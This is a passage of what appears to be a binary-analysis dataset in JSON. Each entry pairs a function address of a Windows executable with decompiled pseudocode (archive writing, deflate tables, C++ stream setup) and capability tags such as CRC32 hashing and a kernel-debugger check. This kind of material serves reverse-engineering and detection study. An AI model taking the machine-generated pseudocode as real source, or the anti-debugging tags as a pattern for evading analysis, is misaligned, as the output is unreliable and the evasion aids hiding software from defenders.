((acStack532[0] == '\\0' || (acStack532[1] != ':')))) goto code_r0x00409a75;\n            (**0x45fdec)(auStack272, 0x444614, acStack532, pcVar4);\n        }\n        pcVar4 = (**0x45fe2c)(auStack272, 0x40000000, 0, 0, 2, uStack568, 0);\n    }\n    if (pcVar4 != 0xffffffff) {\n        fcn.00409360(*param_1, param_1[0x4e]);\n        if (param_1[0x4f] == 0) {\n            iVar5 = fcn.00426941(0x4000);\n            param_1[0x4f] = iVar5;\n        }\n        iVar5 = 0;\n        do {\n            iVar3 = fcn.004094f0(*param_1, param_1[0x4f], 0x4000, &stack0xfffffcbb);\n            if (iVar3 == -0x6a) {\n                iVar5 = 0x1000;\n                goto code_r0x00409ba6;\n            }\n            if (iVar3 < 0) break;\n            if ((0 < iVar3) && (iVar6 = (**0x45fe98)(pcVar4, param_1[0x4f], iVar3, &stack0xfffffcbc, 0),  iVar6 == 0)) {\n                iVar5 = 0x400;\n                goto code_r0x00409ba6;\n            }\n            if (unaff_ESI >> 0x18 != '\\0') goto code_r0x00409ba6;\n        } while (iVar3 != 0);\n        iVar5 = 0x5000000;\ncode_r0x00409ba6:\n        fcn.00407550(*param_1);\n        if (iVar5 == 0) {\n            (**0x45ffd4)(pcVar4, auStack556, auStack564, auStack548);\n        }\n        if (param_3 != 0x1) {\n            (**0x45fe30)(pcVar4);\n        }\n    }\ncode_r0x00409be8:\n    fcn.00427841(unaff_ESI);\n    return;\n}\n",
        "token_count": 1684
    },
    "00409d30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00409d30(int32_t *param_1, int32_t param_2, char *param_3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint unaff_EBP;\n    char *pcVar9;\n    uint in_stack_fffffcb8;\n    uchar auStack832 [8];\n    uchar auStack824 [256];\n    uint32_t uStack568;\n    uchar auStack564 [8];\n    uchar auStack556 [8];\n    uchar auStack548 [16];\n    char acStack532 [260];\n    uchar auStack272 [268];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ auStack832;\n    if (param_1 == NULL) {\n        iVar4 = 0x10000;\n        goto code_r0x00409ff1;\n    }\n    if (*param_1 != 1) {\n        iVar4 = 0x80000;\n        goto code_r0x00409ff1;\n    }\n    piVar3 = param_1[1];\n    in_stack_fffffcb8 = unaff_EBP;\n    if (piVar3[1] != -1) {\n        fcn.00407550(*piVar3);\n        in_stack_fffffcb8 = unaff_EBP;\n    }\n    iVar4 = *piVar3;\n    piVar3[1] = -1;\n    if (*(iVar4 + 4) <= param_2) {\n        iVar4 = 0x10000;\n        goto code_r0x00409ff1;\n    }\n    if (param_2 < *(iVar4 + 0x10)) {\n        fcn.00407170(iVar4);\n    }\n    iVar4 = *(*piVar3 + 0x10);\n    while (iVar4 < param_2) {\n        iVar4 = *piVar3;\n        if (((iVar4 != 0) && (*(iVar4 + 0x18) != 0)) && (iVar5 = *(iVar4 + 0x10) + 1,  iVar5 != *(iVar4 + 4))) {\n            *(iVar4 + 0x10) = iVar5;\n            *(iVar4 + 0x14) = *(iVar4 + 0x14) + *(iVar4 + 0x50) + *(iVar4 + 0x4c) + 0x2e + *(iVar4 + 0x48);\n            iVar5 = fcn.00406db0(iVar4, iVar4 + 0x28, iVar4 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar4 + 0x18) = iVar5 == 0;\n        }\n        iVar4 = *(*piVar3 + 0x10);\n    }\n    fcn.00407640(param_2, auStack824);\n    if ((uStack568 >> 4 & 1) != 0) {\n        iVar4 = 0;\n        goto code_r0x00409ff1;\n    }\n    cVar2 = *param_3;\n    auStack272[0] = 0;\n    pcVar8 = param_3;\n    pcVar9 = param_3;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar9 = pcVar8 + 1;\n        }\n        pcVar1 = pcVar8 + 1;\n        pcVar8 = pcVar8 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042853b(acStack532, param_3, 0x104);\n    if (pcVar9 == param_3) {\n        acStack532[0] = '\\0';\ncode_r0x00409e85:\n        (**0x45fdec)(auStack272, 0x44461c, piVar3 + 0x50, acStack532, pcVar9);\n    }\n    else {\n        pcVar9[acStack532 + -param_3] = '\\0';\n        if (((acStack532[0] != '/') && (acStack532[0] != '\\\\')) && ((acStack532[0] == '\\0' || (acStack532[1] != ':'))))\n        goto code_r0x00409e85;\n        (**0x45fdec)(auStack272, 0x444614, acStack532, pcVar9);\n    }\n    iVar5 = (**0x45fe2c)(auStack272, 0x40000000, 0, 0, 2, uStack568, 0);\n    if (iVar5 == -1) {\n        iVar4 = 0x200;\n    }\n    else {\n        fcn.00409360(*piVar3, piVar3[0x4e]);\n        if (piVar3[0x4f] == 0) {\n            iVar4 = fcn.00426941(0x4000);\n            piVar3[0x4f] = iVar4;\n        }\n        iVar4 = 0;\n        do {\n            iVar6 = fcn.004094f0(*piVar3, piVar3[0x4f], 0x4000, &stack0xfffffcbb);\n            if (iVar6 == -0x6a) {\n                iVar4 = 0x1000;\n                goto code_r0x00409fb7;\n            }\n            if (iVar6 < 0) break;\n            if ((0 < iVar6) && (iVar7 = (**0x45fe98)(iVar5, piVar3[0x4f], iVar6, &stack0xfffffcbc, 0),  iVar7 == 0)) {\n                iVar4 = 0x400;\n                goto code_r0x00409fb7;\n            }\n            if (in_stack_fffffcb8 >> 0x18 != '\\0') goto code_r0x00409fb7;\n        } while (iVar6 != 0);\n        iVar4 = 0x5000000;\ncode_r0x00409fb7:\n        fcn.00407550(*piVar3);\n        if (iVar4 == 0) {\n            (**0x45ffd4)(iVar5, auStack556, auStack564, auStack548);\n        }\n        (**0x45fe30)(iVar5);\n    }\ncode_r0x00409ff1:\n    *0x44f3cc = iVar4;\n    fcn.00427841(in_stack_fffffcb8);\n    return;\n}\n",
        "token_count": 1496
    },
    "00415d00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00415d00(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    code **ppcVar4;\n    bool bVar5;\n    int32_t **in_FS_OFFSET;\n    uint auStack68 [13];\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b4ab;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x44d6a0 ^ &stack0xffffffb0;\n    *in_FS_OFFSET = &piStack12;\n    bVar5 = false;\n    auStack68[0] = 0;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        ppcVar2 = fcn.00427f31(0x18);\n        uStack4 = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar3 = *(*param_2 + 0x18);\n            if (iVar3 == 0) {\n                iVar3 = *param_2 + 0x1c;\n            }\n            fcn.00415ba0(iVar3, uVar1);\n            bVar5 = true;\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_char_.0;\n            ppcVar4 = fcn.00426a59(auStack68);\n            ppcVar2[2] = *ppcVar4;\n            ppcVar2[3] = ppcVar4[1];\n            ppcVar2[4] = ppcVar4[2];\n            ppcVar2[5] = ppcVar4[3];\n        }\n        uStack8 = 0xffffffff;\n        *param_1 = ppcVar2;\n        if (bVar5) {\n            fcn.00415c50();\n        }\n    }\n    *in_FS_OFFSET = piStack16;\n    return 2;\n}\n",
        "token_count": 493
    },
    "00416160": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00416160(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b50b;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x44d6a0 ^ &stack0xffffffc0;\n    *in_FS_OFFSET = &piStack12;\n    bVar4 = false;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        ppcVar2 = fcn.00427f31(8);\n        uStack4 = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar3 = *(*param_2 + 0x18);\n            if (iVar3 == 0) {\n                iVar3 = *param_2 + 0x1c;\n            }\n            fcn.00415ba0(iVar3, uVar1);\n            bVar4 = true;\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::codecvt_char__char__int_.0;\n        }\n        uStack8 = 0xffffffff;\n        *param_1 = ppcVar2;\n        if (bVar4) {\n            fcn.00415c50();\n        }\n    }\n    *in_FS_OFFSET = piStack16;\n    return 2;\n}\n",
        "token_count": 387
    },
    "00416270": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00416270(int32_t *param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43b538;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    iVar6 = *(*param_1 + 4) + param_1;\n    if (*(*(*param_1 + 4) + 0xc + param_1) == 0) {\n        if (*(iVar6 + 0x3c) != 0) {\n            fcn.00416220();\n        }\n        if ((var_8h == '\\0') && ((*(*(*param_1 + 4) + 0x14 + param_1) & 1) != 0)) {\n            uVar3 = fcn.00412730(&param_2);\n            var_4h = 0;\n            iVar6 = fcn.00416010(uVar3);\n            fcn.004126c0();\n            piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n            var_4h = 1;\n            if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n                uVar4 = (**(*piVar1 + 0x18))();\n            }\n            else {\n                uVar4 = **piVar1[8];\n            }\n            while (uVar4 != 0xffffffff) {\n                if ((*(*(iVar6 + 0x10) + (uVar4 & 0xff) * 2) & 0x48) == 0) goto code_r0x00416362;\n                uVar4 = fcn.00415df0();\n            }\n            uVar4 = *(*(*param_1 + 4) + 0xc + param_1);\n            uVar5 = uVar4 | 1;\n            if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n                uVar5 = uVar4 | 5;\n            }\n            fcn.00415430(uVar5, 0);\ncode_r0x00416362:\n            var_4h = 0xffffffff;\n        }\n        iVar2 = *param_1;\n        iVar6 = *(iVar2 + 4) + param_1;\n        if (*(iVar6 + 0xc) == 0) {\n            *in_FS_OFFSET = var_ch_2;\n            return CONCAT31(iVar2 >> 8, 1);\n        }\n    }\n    uVar4 = *(iVar6 + 0xc) | 2;\n    if (*(iVar6 + 0x38) == 0) {\n        uVar4 = *(iVar6 + 0xc) | 6;\n    }\n    uVar4 = fcn.00415430(uVar4, 0);\n    *in_FS_OFFSET = var_ch_2;\n    return uVar4 & 0xffffff00;\n}\n",
        "token_count": 772
    },
    "0041d550": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d550(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x40) & 1) != 0) {\n        fcn.00427a17(**(param_1 + 0x10));\n    }\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    **(param_1 + 0x14) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    *(param_1 + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 206
    },
    "0041e150": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0041e150(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t **in_FS_OFFSET;\n    ulong uVar5;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b50b;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x44d6a0 ^ &stack0xffffffc0;\n    *in_FS_OFFSET = &piStack12;\n    bVar4 = false;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        ppcVar2 = fcn.00427f31(0x10);\n        uStack4 = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar3 = *(*param_2 + 0x18);\n            if (iVar3 == 0) {\n                iVar3 = *param_2 + 0x1c;\n            }\n            fcn.00415ba0(iVar3, uVar1);\n            bVar4 = true;\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            uVar5 = fcn.00427276();\n            ppcVar2[2] = uVar5;\n            ppcVar2[3] = uVar5 >> 0x20;\n        }\n        uStack8 = 0xffffffff;\n        *param_1 = ppcVar2;\n        if (bVar4) {\n            fcn.00415c50();\n        }\n    }\n    *in_FS_OFFSET = piStack16;\n    return 4;\n}\n",
        "token_count": 451
    },
    "0041e500": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0041e500(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    bool bVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack24;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43be7c;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x44d6a0 ^ &stack0xffffffc0;\n    *in_FS_OFFSET = &piStack12;\n    bVar5 = false;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        ppcVar2 = fcn.00427f31(0x18);\n        uStack4 = 0;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar3 = *(*param_2 + 0x18);\n            if (iVar3 == 0) {\n                iVar3 = *param_2 + 0x1c;\n            }\n            uVar4 = fcn.00415ba0(iVar3, uVar1);\n            bVar5 = true;\n            ppcVar2[1] = NULL;\n            uStack8 = 2;\n            *ppcVar2 = vtable.std::numpunct_char_.0;\n            fcn.0041db00(uVar4, 1);\n        }\n        *param_1 = ppcVar2;\n        if (bVar5) {\n            fcn.00415c50();\n        }\n    }\n    *in_FS_OFFSET = piStack24;\n    return 4;\n}\n",
        "token_count": 411
    },
    "0041f720": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041f7f2)\n\nint32_t * __thiscall fcn.0041f720(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack24;\n    int32_t *piStack12;\n    uint32_t uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43c06f;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x44d6a0 ^ &stack0xffffffd8;\n    *in_FS_OFFSET = &piStack12;\n    if (param_3 != 0) {\n        *param_1 = 0x446554;\n        param_1[0x14] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        uStack4 = 0;\n    }\n    *(param_1 + *(*param_1 + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    iVar1 = *(*param_1 + 4);\n    fcn.00415580(uVar3);\n    *(param_1 + iVar1 + 0x38) = param_1 + 1;\n    *(param_1 + iVar1 + 0x3c) = 0;\n    uVar2 = fcn.00416600(0x20);\n    *(param_1 + iVar1 + 0x40) = uVar2;\n    if (*(param_1 + iVar1 + 0x38) == 0) {\n        fcn.00415430(*(param_1 + iVar1 + 0xc) | 4, 0);\n    }\n    uVar3 = uStack8;\n    *(param_1 + *(*param_1 + 4)) =\n         vtable.std::basic_ostringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    fcn.00415f10();\n    uVar4 = 0;\n    param_1[1] = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    if ((uVar3 & 1) == 0) {\n        uVar4 = 4;\n    }\n    if ((uVar3 & 8) != 0) {\n        uVar4 = uVar4 | 8;\n    }\n    if ((uVar3 & 4) != 0) {\n        uVar4 = uVar4 | 0x10;\n    }\n    param_1[0x11] = uVar4;\n    param_1[0x10] = 0;\n    *in_FS_OFFSET = piStack24;\n    return param_1;\n}\n",
        "token_count": 656
    },
    "00423d30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00423d30(uint32_t param_1, uint32_t param_2, uint param_3, uint *param_4, uint32_t param_5)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar6;\n    uchar *in_stack_ffffff6c;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint32_t uStack132;\n    uint32_t *puStack128;\n    int32_t iStack124;\n    uint uStack120;\n    uint32_t uStack116;\n    uint uStack112;\n    int16_t iStack100;\n    uint32_t *puStack84;\n    uint32_t *puStack76;\n    uint uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    int32_t iStack48;\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ &stack0xffffffac;\n    uStack60 = param_2;\n    uStack68 = param_3;\n    uStack64 = param_5;\n    iVar2 = (**0x45ff28)();\n    if (iVar2 == 0) {\n        fcn.00427841(unaff_EDI);\n        return;\n    }\n    uVar4 = (uStack64 & 1) != 0;\n    if ((uStack64 & 2) != 0) {\n        uVar4 = uVar4 | 2;\n    }\n    if ((uStack64 & 4) != 0) {\n        uVar4 = uVar4 | 4;\n    }\n    if ((uStack64 & 0x10) != 0) {\n        uVar4 = uVar4 | 0x10;\n    }\n    if ((uStack64 & 0x20) != 0) {\n        uVar4 = uVar4 | 0x20;\n    }\n    if ((uStack64 & 0x10) == 0) {\n        uVar4 = uVar4 | 0x80000000;\n    }\n    else {\n        uVar4 = uVar4 | 0x40000000;\n    }\n    uVar5 = uVar4 | 0x1000000;\n    if ((uStack64 & 1) == 0) {\n        uVar5 = uVar4 | 0x1800000;\n    }\n    uStack112 = 0;\n    uStack116 = param_1;\n    uStack120 = 0x423de4;\n    puVar3 = (**0x460008)();\n    if (0x28 < puVar3) {\n        uStack120 = 0;\n        iStack124 = 0;\n        puStack128 = NULL;\n        uStack132 = param_1;\n        uStack136 = 0x423dfc;\n        (**0x45fe48)();\n        uStack136 = 0;\n        puStack140 = &stack0xffffff94;\n        uStack144 = 2;\n        in_stack_ffffff6c = &stack0xffffff8c;\n        (**0x45ff54)(param_1);\n        (**0x45fe48)(param_1, 0x24, 0, 0);\n        (**0x45ff54)(param_1, &stack0xffffff6c, 4, &stack0xffffff70, 0);\n        iStack100 = param_1;\n        if ((iStack100 == 0x54ad) && (&stack0xfffffffc < puVar3)) {\n            uStack120 = 0;\n            iStack124 = 0;\n            uStack132 = param_1;\n            uStack136 = 0x423e56;\n            puStack128 = &stack0xffffffc8;\n            (**0x45fe48)();\n            uStack136 = 0;\n            puStack140 = &stack0xffffff94;\n            uStack144 = 4;\n            in_stack_ffffff6c = &stack0xffffff98;\n            (**0x45ff54)(param_1);\n            if ((unaff_ESI == 0x5a4d) || (((unaff_ESI == 0x454e || (unaff_ESI == 0x454c)) || (unaff_ESI == 0x4550)))) {\n                uVar5 = uVar5 | 0x400000;\n            }\n        }\n    }\n    if (puStack76 != NULL) {\n        *puStack76 = uVar5;\n    }\n    if (puStack84 != NULL) {\n        *puStack84 = puVar3;\n    }\n    if (param_4 != NULL) {\n        uStack116 = 0;\n        puStack128 = uStack60 + 0x2ac18000;\n        uStack120 = 10000000;\n        iStack124 = (uStack56 + 0xfe624e22) - (uStack60 < 0xd53e8000);\n        uStack132 = 0x423ed4;\n        uVar6 = fcn.004288e0();\n        *param_4 = uVar6;\n        uStack132 = 0;\n        uStack144 = uStack52 + 0x2ac18000;\n        uStack136 = 10000000;\n        puStack140 = (iStack48 + -0x19db1de) - (uStack52 < 0xd53e8000);\n        param_4[1] = uVar6 >> 0x20;\n        uVar6 = fcn.004288e0();\n        param_4[3] = uVar6 >> 0x20;\n        param_4[2] = uVar6;\n        in_stack_ffffff6c = NULL;\n        uVar6 = fcn.004288e0(param_1 + 0x2ac18000, &stack0xfe624dea + -(param_1 < 0xd53e8000), 10000000);\n        param_4[4] = uVar6;\n        param_4[5] = uVar6 >> 0x20;\n    }\n    puVar1 = puStack128;\n    if (puStack128 != NULL) {\n        fcn.00423cb0(uStack52, iStack48, &stack0xffffff6c, &stack0xffffff70);\n        *puVar1 = uStack144 & 0xffff | in_stack_ffffff6c << 0x10;\n    }\n    fcn.00427841(in_stack_ffffff6c);\n    return;\n}\n",
        "token_count": 1488
    },
    "00424810": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00424810(int32_t *param_1, uint8_t param_2)\n\n{\n    if (param_1[0x12] != 0) {\n        fcn.00427a17(param_1[0x12]);\n    }\n    param_1[0x12] = 0;\n    if (param_1[0xf] != 0) {\n        fcn.00427a17(param_1[0xf]);\n    }\n    param_1[0xf] = 0;\n    if (*param_1 != 0) {\n        fcn.00427a17(*param_1);\n    }\n    *param_1 = 0;\n    if ((param_2 & 1) != 0) {\n        fcn.00427a17(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 192
    },
    "00424870": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00424870(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint in_stack_ffffffdc;\n    \n    iVar2 = 0;\n    iVar5 = 1;\n    piVar6 = param_1 + 0xfe4;\n    do {\n        iVar2 = (*piVar6 + iVar2) * 2;\n        *(&stack0xffffffdc + iVar5 * 2) = iVar2;\n        iVar5 = iVar5 + 1;\n        piVar6 = piVar6 + 1;\n    } while (iVar5 < 0x10);\n    iVar5 = 0;\n    if (-1 < param_3) {\n        do {\n            uVar7 = *(param_2 + 2 + iVar5 * 4);\n            if (uVar7 != 0) {\n                uVar3 = *(&stack0xffffffdc + uVar7 * 2);\n                *(&stack0xffffffdc + uVar7 * 2) = *(&stack0xffffffdc + uVar7 * 2) + 1;\n                uVar1 = 0;\n                do {\n                    uVar4 = uVar1;\n                    uVar8 = uVar3 & 1;\n                    uVar7 = uVar7 - 1;\n                    uVar3 = uVar3 >> 1;\n                    uVar1 = (uVar4 | uVar8) * 2;\n                } while (0 < uVar7);\n                *(param_2 + iVar5 * 4) = uVar4 | uVar8;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 <= param_3);\n    }\n    fcn.00427841(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 451
    },
    "00424dc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00424dc0(uint16_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t uStack5;\n    int32_t iStack4;\n    \n    iVar3 = param_1;\n    uVar5 = 0;\n    iStack4 = 0;\n    uStack5 = 0;\n    if (*(param_1 + 0x1af2c) != 0) {\n        param_1 = param_1 + 0x9f2c;\n        do {\n            if ((uVar5 & 7) == 0) {\n                uStack5 = *(iStack4 + 0x19f2c + iVar3);\n                iStack4 = iStack4 + 1;\n            }\n            uVar7 = *(iVar3 + 0x1f2c + uVar5);\n            uVar5 = uVar5 + 1;\n            if ((uStack5 & 1) == 0) {\n                uVar6 = *(param_2 + 2 + uVar7 * 4);\n                uVar7 = *(param_2 + uVar7 * 4);\ncode_r0x00424ecb:\n                fcn.00422c10(iVar3, uVar7, uVar6);\n            }\n            else {\n                uVar6 = *(uVar7 + 0x1b3d + iVar3);\n                fcn.00422c10(iVar3, *(param_2 + 0x404 + uVar6 * 4), *(param_2 + 0x406 + uVar6 * 4));\n                iVar2 = *(uVar6 * 4 + 0x4465a0);\n                if (iVar2 != 0) {\n                    fcn.00422c10(iVar3, uVar7 - *(iVar3 + 0x1e40 + uVar6 * 4), iVar2);\n                }\n                uVar1 = *param_1;\n                uVar7 = uVar1;\n                param_1 = param_1 + 1;\n                if (uVar7 < 0x100) {\n                    uVar4 = *(iVar3 + 0x1c3d + uVar7);\n                }\n                else {\n                    uVar4 = *((uVar1 >> 7) + 0x1d3d + iVar3);\n                }\n                uVar8 = uVar4;\n                fcn.00422c10(iVar3, *(param_3 + uVar8 * 4), *(param_3 + 2 + uVar8 * 4));\n                uVar6 = *(uVar8 * 4 + 0x446628);\n                if (uVar6 != 0) {\n                    uVar7 = uVar7 - *(iVar3 + 0x1eb4 + uVar8 * 4);\n                    goto code_r0x00424ecb;\n                }\n            }\n            uStack5 = uStack5 >> 1;\n        } while (uVar5 < *(iVar3 + 0x1af2c));\n    }\n    fcn.00422c10(iVar3, *(param_2 + 0x400), *(param_2 + 0x402));\n    return;\n}\n",
        "token_count": 775
    },
    "00425330": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00425330(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint16_t *puVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    \n    iVar1 = param_1;\n    *(param_1 + 0x1af50) = param_2;\n    iVar3 = 0;\n    *(param_1 + 0x1af48) = 0;\n    *(param_1 + 0x1af44) = 0;\n    *(param_1 + 0x1af4c) = 0;\n    if (*(param_1 + 0xe7e) == 0) {\n        param_1 = param_1 + 0x1e40;\n        cVar8 = '\\0';\n        puVar7 = 0x4465a0;\n        do {\n            *param_1 = iVar3;\n            iVar12 = 0;\n            if (0 < 1 << (*puVar7 & 0x1f)) {\n                do {\n                    *(iVar1 + 0x1b3d + iVar3) = cVar8;\n                    iVar12 = iVar12 + 1;\n                    iVar3 = iVar3 + 1;\n                } while (iVar12 < 1 << (*puVar7 & 0x1f));\n            }\n            param_1 = param_1 + 1;\n            puVar7 = puVar7 + 1;\n            cVar8 = cVar8 + '\\x01';\n        } while (puVar7 < 0x446610);\n        *(iVar3 + 0x1b3c + iVar1) = cVar8;\n        param_1 = iVar1 + 0x1eb4;\n        iVar3 = 0;\n        iVar12 = 0;\n        puVar7 = 0x446628;\n        do {\n            *param_1 = iVar3;\n            iVar9 = 0;\n            if (0 < 1 << (*puVar7 & 0x1f)) {\n                do {\n                    *(iVar1 + 0x1c3d + iVar3) = iVar12;\n                    iVar9 = iVar9 + 1;\n                    iVar3 = iVar3 + 1;\n                } while (iVar9 < 1 << (*puVar7 & 0x1f));\n            }\n            param_1 = param_1 + 1;\n            puVar7 = puVar7 + 1;\n            iVar12 = iVar12 + 1;\n        } while (puVar7 < 0x446668);\n        iVar3 = iVar3 >> 7;\n        if (iVar12 < 0x1e) {\n            param_1 = iVar1 + 0x1eb4 + iVar12 * 4;\n            puVar7 = iVar12 * 4 + 0x446628;\n            do {\n                *param_1 = iVar3 << 7;\n                iVar9 = 0;\n                if (0 < 1 << (*puVar7 - 7U & 0x1f)) {\n                    do {\n                        *(iVar1 + 0x1d3d + iVar3) = iVar12;\n                        iVar9 = iVar9 + 1;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar9 < 1 << (*puVar7 - 7U & 0x1f));\n                }\n                param_1 = param_1 + 1;\n                puVar7 = puVar7 + 1;\n                iVar12 = iVar12 + 1;\n            } while (puVar7 < 